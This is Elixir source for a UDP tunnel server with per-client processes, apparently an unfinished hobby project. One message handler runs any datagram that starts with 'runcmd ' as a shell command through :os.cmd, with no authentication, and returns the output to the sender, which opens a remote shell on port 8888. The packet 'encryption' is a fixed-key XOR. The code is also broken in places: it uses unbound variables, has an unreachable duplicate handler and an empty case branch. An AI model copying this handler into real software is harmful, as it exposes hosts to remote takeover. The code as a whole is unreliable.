defmodule Aclient do
  use GenServer

  def start(p) do
    GenServer.start __MODULE__, p
  end

  def init({hostname, port, client_id, reqid, dest_hostport, socket}) do
    :erlang.send_after 100, self(), :tick

    IO.puts "created a client proc"
    #queue a hello_ack(s)
    #once receive a hello_ack(c) start the tcp connection
    queue = :ets.new :packets_queue, []

    :ets.insert queue, {:hello_ack, Udptun.dec(hello_ack_packet(client_id, req_id))}

    st = %{
        hostname: hostname,
        port: port,
        client_id: client_id,
        sendsock: socket,
        queue: queue,
        queueptr: :"$end_of_table",
        dest_hostport: dest_hostport,
        #reqid: reqid
      }
    {:ok, st}
  end


  def hello_ack_packet(client_id, req_id) do
    <<
      0::64-little, #incremental unique identifier?
      client_id::64-little,
      Udptun.atom_to_type(MSG_TYPE_HELLO_ACK),
      0::16-little,
      0::64-little,
      0::64-little,

      req_id::64-little
    >>
  end

  def handle_info(:tick, state) do
    #if there is something in the queue, send it, if not, idle
    #procqueue
    {state, packet} = nextpacket state
    if packet != nil do
      #got a packet to send!
      #IO.puts "sending something of size ${byte_size packet}"
      :gen_udp.send state.sendsock, state.hostname, state.port, packet
    end

    :erlang.send_after 50, self(), :tick

    {:noreply, state}
  end

  def nextpacket(state = %{
      queue: queue,
      queueptr: queueptr
    }) do
      next = case queueptr do
        :"$end_of_table" ->
          :ets.first queue
        a ->
          :ets.next queue, a
      end

      npacket = if next != :"$end_of_table" do
        [{key, packet}] = :ets.lookup queue, next
        packet
      else
        nil
      end

      {%{state | queueptr: next}, npacket}
  end
end

defmodule Udptun do
  use GenServer

  def start() do
    GenServer.start Udptun, []
  end

  def init(_) do
    :ets.new :clients, [:named_table]
    {:ok, port} = :gen_udp.open 8888, [mode: :binary]
    IO.inspect port
    {:ok, port}
  end


  def process_info(:quit, x) do
    IO.inspect :killed
    exit(:halt)
  end

  def handle_info({:udp, asock, hostname, port, "runcmd "<>cmd}, prevstate) do
      IO.inspect {:got_cmd, cmd}
      res = :os.cmd 'timeout 1 #{cmd}'
      IO.inspect {:cmd_result, res}
      :gen_udp.send asock, hostname, port, res
      {:noreply, prevstate}
  end

  def handle_info({:udp, _asock, hostname, port, binmsg}, prevstate) do
      decoded = dec(binmsg, "")
      <<
        packetid::64-little,
        client_id::64-little,
        type,
        length::16-little,
        seq_id::64-little,
        ack_id::64-little,
        rest::binary
      >> = decoded


      prevstate = handle_packet(hostname, port, {packetid,
        client_id,
        type_to_atom(type),
        length,
        seq_id,
        ack_id}, rest, prevstate)

      {:noreply, prevstate}
  end


  def atom_to_type(MSG_TYPE_DISCART), do: 0
  def atom_to_type(MSG_TYPE_HELLO), do: 0x02
  def atom_to_type(MSG_TYPE_HELLO_ACK), do: 3
  def atom_to_type(MSG_TYPE_ACK_PAGE), do: 0x09
  def atom_to_type(MSG_TYPE_ACK_PAGE_PARTIAL), do: 0x0a
  def atom_to_type(_), do: MSG_UNKNOWN

  def type_to_atom(0x00), do: MSG_TYPE_DISCART
  def type_to_atom(0x02), do: MSG_TYPE_HELLO
  def type_to_atom(0x03), do: MSG_TYPE_HELLO_ACK
  def type_to_atom(0x09), do: MSG_TYPE_ACK_PAGE
  def type_to_atom(0x0a), do: MSG_TYPE_ACK_PAGE_PARTIAL
  def type_to_atom(_), do: MSG_UNKNOWN

  #define MSG_TYPE_DISCART   0x00
  #define MSG_TYPE_GOODBYE   0x01
  #define MSG_TYPE_HELLO     0x02
  #define MSG_TYPE_HELLOACK  0x03
  #define MSG_TYPE_KEEPALIVE 0x04
  #define MSG_TYPE_DATA0     0x05
  #define MSG_TYPE_DATA1     0x06
  #define MSG_TYPE_ACK0      0x07
  #define MSG_TYPE_ACK1      0x08
  #define MSG_TYPE_ACK_PAGE  0x09
  #define MSG_TYPE_ACK_PAGE_PARTIAL 0x0a
  #define MSG_TYPE_ACK_OOB 0x0b
  def handle_packet(hostname, port, {packetid,
                        client_id,
                        type,
                        length,
                        seq_id,
                        ack_id}, rest, prevstate) do

      # IO.inspect {:got_packet, packetid,
      #         client_id,
      #         type,
      #         length,
      #         seq_id,
      #         ack_id}

    # MSG_TYPE_HELLO(C) ->  MSG_TYPE_HELLOACK(S) -> MSG_TYPE_HELLOACK(C)
    # list of clients
    # every client is a proc
    # client has?
    # host/port, self-id, proc
    # if client doesn't exists, and msg isn't MSG_TYPE_HELLO, terminate conn
    if MSG_TYPE_HELLO == type do
      rest = :binary.part rest, 0, length
      {reqid, dest_hostport} = case rest do
        <<reqid::64-little, rest::binary>> ->
          {reqid, rest}
        _ ->
          {nil, ""}
      end

      lk = :ets.lookup :clients, {hostname, port, client_id}
      case lk do
        [{_, proc}] ->
            IO.puts "(IGNORED PACKET) client proc already exists #{reqid} #{inspect hostport}"
        _ ->
          IO.inspect {:got_packet, packetid,
                  client_id,
                  type,
                  length,
                  seq_id,
                  ack_id}

            {:ok, newproc} = Aclient.start {hostname, port, client_id, reqid, dest_hostport, prevstate}

            :ets.insert :clients, {{hostname, port, client_id}, newproc}
      end
    else
      IO.puts "(IGNORED PACKET) probably ignored packet #{type} #{packetid}"
      lk = :ets.lookup :clients, {hostname, port, client_id}
      case lk do
        [{_, proc}] ->
          send proc, {:got_packet, packetid,
          client_id,
          type,
          length,
          seq_id,
          ack_id, rest}
        _ ->
            #send nack, so the client knows its a dead connection
      end
    end

    prevstate
  end

  def handle_info({:udp, _asock, hostname, port, binmsg}, prevstate) do
      IO.inspect {:got_msg, dec(binmsg, "")}

      {:noreply, prevstate}
  end

  def dec("", pad) do
    pad
  end

  def dec(<<msg::binary-size(85), rest::binary >>, pad) do
    key = "04fhqhoiuhbr9cp-8h31rn9p8qwh89qphacf9[qwe9a9h[-dcva9sdfhsdiuoh[0890q bhfupioandvfuhio"
    dec(rest, pad <> :crypto.exor(key, msg))
  end

  def dec(msg, pad) do
    key = "04fhqhoiuhbr9cp-8h31rn9p8qwh89qphacf9[qwe9a9h[-dcva9sdfhsdiuoh[0890q bhfupioandvfuhio"
    pkey = :binary.part key, 0, byte_size(msg)
    pad <> :crypto.exor(pkey, msg)
  end
end

#p = GenServer.start Udptun, []
